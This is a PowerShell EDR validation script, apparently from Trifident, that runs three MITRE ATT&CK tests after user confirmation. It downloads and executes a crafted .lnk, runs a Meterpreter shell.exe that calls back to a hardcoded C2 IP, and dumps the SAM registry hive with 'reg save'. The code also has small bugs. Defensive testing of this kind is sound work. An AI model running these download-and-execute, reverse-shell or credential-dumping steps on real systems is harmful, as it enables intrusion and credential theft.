# Function to display the logo
function Show-Logo {
    Write-Host @"                                                                           
                                                                                                @@@      
                                                                                             @@@ @ @@@@  
                                                                                           @@@ @ @@@ @   
                                                                                        @@@@ @@@@ @  @@@ 
                                                                                     /@@@ @@@@  @@@@@ @  
                                                                                  #@@. @@@@ @@@@@ &@     
                                                                               @@@@@@@@  @@@   @@@@@@&   
                                                                            @@@@@@@@@@@@  @@@@@@ @@      
                                                                         @@@@@@@@@@@@@@@@   @@@@@@       
                                                                      @@@@@@@@@@@@@ %@@@@@   @@          
                                                  @@               @@@@    @@@@@@@@   @@@@@@@.@          
                                             @@@@ @@@@          @@@@       @@@@@@@@      @@              
                                          @@@     @@@@@@      @@@@       @@@@@@@@@@@@  @                 
                                       @@@@            @@@   @@@       @@@@@@@@@@@@@@ @                  
                                       @@               @@@ @@@       @@@@@@@  @@@@                      
                                        @@              @@@@@@      @@@@@@@@@@  @@                       
                                         @@              @@@@      @@@@@@@@@@@@                          
                                          @(          /@@@        @@@@@    @                             
                                          @@       @@@@          @@@@@@@@ @                              
                                          @ @@@@@@@#             /@@@@@@@                                
                                        @@@@@@@                    @@@@ @                                
                                      @  @@@@@                       @@@@                                
                                    @  @@@@             @@/            @@@@@@                            
                                   @ %@@ @@  @@@@@@@@,   @@         ,@@@@@@@@@@@@@@@@@@@@@@@@@@@         
                                    @ @@         @@@@@  @@@@@@@@@@@  ,@@@@@@@@@@@@,@@% ,@@@@@@@          
                                     @           @@@@@ @@                  &@@& @@  @@@@@@               
                                                @@@@@@@*                                                 
                                               @@@ @@         TRIFIDENT VALIDATION                                           
                                            @@   @            - POWERSHELL TESTS -                                            
                                         @@ @@@@@                                                         
                                             @                       
"@
}

function Get-OSType {
    $unameOutput = $(uname -s)

    if ($unameOutput -eq "Darwin") {
        $os = "macOS"
        $color = "Yellow"
    } elseif ($unameOutput -eq "Linux") {
        $os = "Linux"
        $color = "Green"
    } elseif ($unameOutput -eq "WindowsNT" -or $unameOutput -eq "MINGW32_NT-10.0" -or $unameOutput -eq "MINGW64_NT-10.0") {
        $os = "Windows"
        $color = "Cyan"
    } else {
        $os = "Unknown"
        $color = "Red"
    }

    # Print the operating system with color and bold style
    Write-Host -NoNewline "`nOperating System: "
    Write-Host "$os" -ForegroundColor $color -BackgroundColor Black
    Log-Message "Operating System: $os - Selecting appropriate tests"
    return $os
}

function Test-C2-Port {
    $IPAddress = "172.174.245.183"
    $Port = 9191
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.Connect($IPAddress, $Port)
        $tcpClient.Close()
        Log-Message "C2 IS CURRENTLY LISTENING and Operational" "C2 Operational"
    } catch {
        Log-Message "C2 Server is NOT LISTENING (PORT NOT ACCESSIBLE)"
    }
}

function Test-SMTPAuthentication {
    do {
        # Prompt the user for SMTP server, username, and password
        $SmtpServer = "mail.smtp2go.com"
        $Username = "ValidationScript"
        $SecurePassword = $ScriptPassword

        # Create a credential object
        $Credentials = New-Object System.Management.Automation.PSCredential ($Username, $SecurePassword)

        # Attempt to connect to the SMTP server and authenticate
        try {
            $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer)
            $SMTPClient.EnableSsl = $true
            $SMTPClient.Credentials = $Credentials
            $SMTPClient.Timeout = 5000  # Set timeout to 5 seconds
            Log-Message "Attempting Script Authentication"
            $SMTPClient.Send("ValidationScript@trifident.com", "to@example.com", "", "")

            # If no exception is thrown, authentication was successful
            Log-Message "Authentication successful. Proceeding with the script..."
            return 
        } catch {
            # If an exception is thrown, authentication failed
            Log-Message "Authentication failed. Please check your credentials and try again."
            $ScriptPassword = Get-Script-Password
        }
    } while ($true)  # Continue prompting until successful authentication
}

function Get-Script-Password {
    # Prompt the user for a password without showing the username prompt
    Write-Host -NoNewline "Please enter the password provided by TRIFIDENT: "
    $SecurePassword = Read-Host -AsSecureString

    # Convert the secure string password to plain text
    # Convert the secure string password to plain text
    $Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($SecurePassword)
    $password = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)
    [System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)

    # Use the entered password (example)
    #Write-Host "Password: $password"
    return $SecurePassword
}

function Log-Message {
    param(
        [string]$Message,
        [string]$Error
    )

    # Get current timestamp in UTC
    $TimestampUtc = (Get-Date).ToUniversalTime().ToString("yyyy-MM-dd HH:mm:ss UTC")

    # Convert UTC timestamp to Eastern time
    $TimeZone = [System.TimeZoneInfo]::FindSystemTimeZoneById("Eastern Standard Time")
    $TimestampEastern = [System.TimeZoneInfo]::ConvertTimeFromUtc([DateTime]::ParseExact($TimestampUtc, "yyyy-MM-dd HH:mm:ss UTC", $null), $TimeZone).ToString("yyyy-MM-dd HH:mm:ss EST")

    # Format log message with both timestamps
    $LogMessage = "[$TimestampUtc | $TimestampEastern] $Message"
    if ($Error) {
        $LogMessage = "[!] $LogMessage Error: $Error"
        Write-Host $LogMessage -ForegroundColor Red
    } elseif ($Error -eq '') {
        $LogMessage = "[+] $LogMessage"
        Write-Host $LogMessage -ForegroundColor DarkGray
    }

    # Append log message to log file
    Add-Content -Path "logfile.txt" -Value $LogMessage
}

# Function to run commands 
function AtomicTest1-Windows {
    Log-Message "AtomicTest1-Windows: Starting"
    Write-Host "
    Test 1: T1204.002 : User Execution: Defanged malicious .lnk file
    ------------------------------------
    
    LNK files are based on the Shell Link Binary file format, also known as Windows
    shortcuts. But what seems a relatively simple ability to execute other binaries 
    on the system can inflict great harm when abused by threat actors. Microsoft’s 
    decision to block macros by default for files downloaded from the internet in Office 
    applications provoked malware developers to shift to other techniques.
    
    This test downloads a crafted .lnk (Atomic RedTeam) from Trifident's github repository, and 
    then attempts to execute it. When executed, the .lnk file attempts to download a clean 
    copy of Putty (a windows based ssh client) as 'a.exe' and attempts to execute it.

    ------------------------------------
    Expected Outcome: EDR detects, alerts, and quarantines the LNK file, however
    Putty still executes.
    
    "
    
    # First URL to download
    $T1204002Url = "https://github.com/TRIFIDENT/ResponseValidation/raw/main/payloads/test10.lnk"
    
    # Second URL to download (provide your own URL)
    $T1204002Url2 = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"

    $confirmation = Read-Host "Do you want to proceed with T1204.002 : User Execution: Defanged malicious .lnk file? (Y/N)"
    if ($confirmation -ne "Y") {
            Log-Message "AtomicTest1-Windows: Cancelled test, exiting script..."
            return
        }
    
    try {
        # Try downloading the file from the first URL
        Log-Message "AtomicTest1-Windows: Downloading LNK file"
        Invoke-WebRequest -OutFile $tempDirectory\test10.lnk $T1204002Url -ErrorAction Stop
        Log-Message "AtomicTest1-Windows: Downloaded LNK file successfully from $T1204002Url"
    }
    catch {
        # If an error occurs, display the error message
        Log-Message "AtomicTest1-Windows: Error downloading file from $($T1204002Url): $_" -Error $_.Exception.Message
        Log-Message "AtomicTest1-Windows:Trying second URL..."
        
        try {
            # Try downloading the file from the second URL
            Invoke-WebRequest -OutFile $tempDirectory\test10.lnk $T1204002Url2 -ErrorAction Stop
            Log-Message "AtomicTest1-Windows: Downloaded LNK file successfully from $T1204002Url2"
        }
        catch {
            # If an error occurs again, display the error message and exit
            Log-Message "AtomicTest1-Windows: Error downloading file from $($T1204002Url2): $_" -Error $_.Exception.Message
            Log-Message "AtomicTest1-Windows: Unsuccessful Download from both URLs"
            return
        }
    }

    # The test file has been saved to $temp\test10.lnk
    $lnkFile = Join-Path $tempDirectory "test10.lnk"

    # Execute the downloaded file
    try {
        Log-Message "AtomicTest1-Windows: Executing the downloaded file: $lnkFile"
        Start-Process $lnkFile
    } catch {
        Log-Message "AtomicTest1-Windows: Failed to execute the downloaded file: $lnkFile." -Error $_.Exception.Message
    }
    

    # Wait for 10 seconds
    Start-Sleep -Seconds 10

    # Kill the process named "a.exe"
    try {
        Log-Message "AtomicTest1-Windows: Killing the a.exe (putty) process"
        taskkill /IM a.exe /F
    } catch {
        Log-Message "AtomicTest1-Windows: Failed to kill the process: a.exe" -Error $_.Exception.Message
    }

    # Removing all downloaded or created files
    Log-Message "AtomicTest1-Windows: Removing all downloaded or created files"
    $file2 = Join-Path $tempDirectory "a.exe"
    $filesToRemove = $lnkFile, $file2
    foreach ($file in $filesToRemove) {
        Remove-Item $file -ErrorAction Ignore
        Log-Message "Run-AtomicTest1-Windows-1: Removed $file"
    }

}

function AtomicTest2-Windows {
    Log-Message "AtomicTest2-Windows: Starting"

    # Write the test description
    Write-Host "
    Test 2: T1204.002 : User Execution: Defanged Malware: Meterpreter
    ------------------------------------
    
    Meterpreter is a Metasploit attack payload that provides an interactive shell to the
    attacker from which to explore the target machine and execute code. Meterpreter is
    deployed using in-memory DLL injection. As a result, Meterpreter resides entirely in
    memory and writes nothing to disk. It communicates over the stager socket and provides
    a comprehensive client-side Ruby API. It features command history, tab completion,
    channels, and more.

    Shell.exe attempts to shovel a meterpreter shell from the host machine to a Trifident
    owned C2 server over HTTP (port 9191) located in Azure at the IP address of
    172.174.245.183. The C2 meterpreter listener is disabled by default on our C2 server. If
    execution succeeds, the C2 channel will not be established. 
    
    ------------------------------------
    Expected Outcome: EDR detects, alerts, and quarantines shell.exe without execution.
    "

    # Log the C2 server validation
    Write-Host "    Validating the C2 server is " -NoNewline
    Write-Host "non-operational" -ForegroundColor Green -NoNewline
    Write-Host " prior to execution: "
    Test-C2-Port
    $uninstall7z = false
    # First URL to download
    $T12040022Url = "https://github.com/TRIFIDENT/ResponseValidation/raw/main/payloads/shell-trifident.zip"
    
    # Second URL to download (provide your own URL)
    $T12040022Url2 = "YOUR_SECOND_URL_HERE"
    # Log the user confirmation
    $confirmation = Read-Host "`nDo you want to proceed with Test 2: T1204.002 : User Execution: Defanged Malware: Meterpreter? (Y/N)"
    Log-Message "User confirmation: $confirmation"
    if ($confirmation -ne "Y") {
        Log-Message "AtomicTest2-Windows: Cancelled test, exiting script..."
        return
    }

    # Attempt to download the file from the first URL
    try {
        Log-Message "AtomicTest2-Windows: Downloading shell-trifident.zip from first URL"
        Invoke-WebRequest -OutFile "$tempDirectory\shell-trifident.zip" $T12040022Url -ErrorAction Stop
        Log-Message "AtomicTest2-Windows: File downloaded successfully from $T12040022Url"
    }
    catch {
        # If the first attempt fails, try the second URL
        Log-Message "AtomicTest2-Windows: Error downloading file from $T12040022Url" -Error $_.Exception.Message
        Log-Message "AtomicTest2-Windows: Trying second URL"
        try {
            Log-Message "AtomicTest2-Windows: Downloading shell-trifident.zip from second URL"
            Invoke-WebRequest -OutFile "$tempDirectory\shell-trifident.zip" $T12040022Url2 -ErrorAction Stop
            Log-Message "AtomicTest2-Windows: File downloaded successfully from $T12040022Url2"
        }
        catch {
            # If both attempts fail, log the error and exit
            Log-Message "AtomicTest2-Windows: Error downloading file from $T12040022Url2" -Error $_.Exception.Message
            Log-Message "AtomicTest2-Windows: Failed to download the file from both URLs"
            return
        }
    }
    $zipFile = Join-Path $tempDirectory "shell-trifident.zip"
    # Unzip the downloaded file
    # Check if 7Zip4Powershell module needs to be installed
    if (-not (Get-Module -Name 7Zip4Powershell -ListAvailable)) {
        Log-Message "AtomicTest2-Windows: 7Zip4Powershell module Not installed, installing" ""
        $uninstall7z = $true  # Set uninstall flag
        Install-Module -Name 7Zip4Powershell -Force
        Log-Message "AtomicTest2-Windows: 7Zip4Powershell module installed"
    } else {
        Log-Message "AtomicTest2-Windows: 7Zip4Powershell module is already installed."
    }
    
    try {
        if ((Get-Module -Name 7Zip4Powershell -ListAvailable)) {
            Log-Message "AtomicTest2-Windows: Unzipping shell-trifident.zip"
            $ErrorActionPreference = "Stop"  # Set $ErrorActionPreference to "Stop"
            Expand-7Zip -ArchiveFileName $zipFile -Password "trifident" -TargetPath $tempDirectory
            $ErrorActionPreference = "Continue"  # Reset $ErrorActionPreference
            Log-Message "AtomicTest2-Windows: shell-trifident.zip unpacked to $tempDirectory"
        } else {
            Log-Message "AtomicTest2-Windows: Unable to unzip the file because the 7Zip4Powershell module is not available."
            return
        }
    } catch {
        #This errors if script is running on a non-Windows OS.  This should never happen.
        Log-Message "AtomicTest2-Windows: Error unpacking shell-trifident.zip to $tempDirectory" -Error $_.Exception.Message
    }
    
    $executeFile = Join-Path $tempDirectory "shell.exe"

    # Check if the file exists
    if (Test-Path $executeFile) {
        # Execute the downloaded file
        try {
            Log-Message "AtomicTest2-Windows: Executing the downloaded file: $executeFile"
            Start-Process $executeFile -ErrorAction Stop
        } catch {
            Log-Message "AtomicTest2-Windows: Failed to execute the downloaded file: $executeFile. Error: $_" -Error $_.Exception.Message
        }
    } else {
        Log-Message "AtomicTest2-Windows: The file $executeFile does not exist." "File not found"
    }

    # Wait for 10 seconds
    Start-Sleep -Seconds 10

    # Terminate the process
    try {
        Log-Message "AtomicTest2-Windows: Killing the shell.exe process"
        taskkill /IM shell.exe /F
    } catch {
        Log-Message "AtomicTest2-Windows: Failed to terminate the process: shell.exe" -Error $_.Exception.Message
    }

    # Clean up - remove downloaded files
    Log-Message "AtomicTest2-Windows: Removing all downloaded or created files"
    $filesToRemove = $zipFile, $executeFile
    foreach ($file in $filesToRemove) {
        Remove-Item $file -ErrorAction Ignore
        Log-Message "AtomicTest2-Windows: Removed $file"
    }
    Log-Message "AtomicTest2-Windows: Checking to see if we need to uninstall 7Zip4Powershell: $uninstall7z"
    if ($uninstall7z) {
        Log-Message "AtomicTest2-Windows: Uninstalling 7Zip4Powershell"
        Uninstall-Module -Name 7Zip4Powershell -Force
        # Check if the module is installed
        if (Get-Module -Name 7Zip4Powershell -ListAvailable) {
            Log-Message "AtomicTest2-Windows: Module '7Zip4Powershell' is still installed. Please manually uninstall"
        } else {
            Log-Message "AtomicTest2-Windows: Module '7Zip4Powershell' has been successfully uninstalled."
        }
            return
        }
    Log-Message "AtomicTest2-Windows: Completed"
}

function AtomicTest3-Windows {
    Log-Message "AtomicTest3-Windows: Starting"

    # Write the test description
    Write-Host "
    Test 3: T1003.002 : OS Credential Dumping: Security Account Manager
    ------------------------------------
    
    OS Credential Dumping using Living off the Land (LoL) binary 'reg.exe'
    Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through 
    in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that 
    contains local accounts for the local host. Enumerating the SAM database requires SYSTEM level access.
    
    This test uses the LOLbin 'reg' (more info at https://lolbas-project.github.io/lolbas/Binaries/Reg/) to attempt to dump the 
    SAM registry hive to a temp file location. This technique is known by attackers to retrieve password hashes and key material. 

    This test will attempt to escalate to administrator privileges and attempt to run the command:
    'reg save HKLM\sam %temp%\sam' (and if successful, will remove the %temp%\sam file)
    
    ------------------------------------
    Expected Outcome: EDR detects, alerts, and prevents execution.
    "

    # Log the user confirmation
    $confirmation = Read-Host "`nDo you want to proceed with Test 3: T1003.002 : OS Credential Dumping: Security Account Manager? (Y/N)"
    Log-Message "User confirmation: $confirmation"
    if ($confirmation -ne "Y") {
        Log-Message "AtomicTest3-Windows: Cancelled test, exiting script..."
        return
    }

    # Set the temporary file that will save any exported registry hives
    $samFile = Join-Path $tempDirectory "sam"

    # The command that needs to be run with elevated privileges
    $Command = "reg save HKLM\sam $samfile"

    # Start a new PowerShell process with elevated privileges
    try {
        Log-Message "AtomicTest3-Windows: Attempting to execute command as priviledged user"
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { $Command }`"" -Verb RunAs
    } catch {
        Log-Message "AtomicTest3-Windows: Error executing $Command" -Error $_.Exception.Message
    }

    # Check if the file exists
    if (Test-Path $samFile) {
        # Store results and securely delete the file
        Log-Message "AtomicTest3-Windows: sam file exists"
        Log-Message "AtomicTest3-Windows: Securely removing created files"
        try {
            $shell = New-Object -ComObject Shell.Application # Securely deletes file and bypasses Recycle Bin
            $shell.Namespace(0).ParseName($samFile).InvokeVerb("delete") # Securely deletes file and bypasses Recycle Bin
        } catch {
            Log-Message "AtomicTest3-Windows: Unable to delete $samFile" "Unable to delete sam"
        }
    } else {
        Log-Message "AtomicTest3-Windows: sam file does not exist"
    }

    Log-Message "AtomicTest3-Windows: Completed"
}

Log-Message "Starting script execution..."
# Call the function to display the logo and begin tests
Show-Logo
$osType = Get-OSType
# Prompt the user for execution password
$ScriptPassword = Get-Script-Password

# Validate user is authorized to exectute the script
Test-SMTPAuthentication

# Get the temporary directory path
$tempDirectory = [System.IO.Path]::GetTempPath()

# Only run tests valid for the current operating system
if ($osType -eq "Windows") {
    AtomicTest1-Windows
    AtomicTest2-Windows
    AtomicTest3-Windows
} elseif ($osType -eq "macOS") {
    AtomicTest1-Windows
    AtomicTest2-Windows
}



